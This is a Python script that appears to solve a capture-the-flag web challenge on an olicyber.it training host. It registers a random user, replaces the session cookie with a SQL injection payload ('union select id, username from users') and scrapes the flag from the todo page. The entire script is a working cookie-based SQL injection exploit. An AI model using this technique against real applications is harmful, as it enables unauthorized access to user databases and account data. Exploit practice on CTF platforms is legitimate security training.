import requests, requests.sessions, random, string, re

URL = 'http://todo.challs.olicyber.it/'

session = requests.Session()

def randomword(length):
   letters = string.ascii_lowercase
   return ''.join(random.choice(letters) for i in range(length))

username = randomword(10)
password = randomword(10)

data = {'username': f'{username}', 'password': f'{password}', 'confirm_password': f'{password}'}
payload = '\' union select id, username from users where username = \'antonio'


r = session.post(URL, data)

for cookie in session.cookies:
   if cookie.name == 'session':
      cookie.value = f'{payload}'
      break

r = session.get(URL+'todo')

flag = re.findall(r'flag\{.*?}', r.text)
if flag:
    print(flag[0])
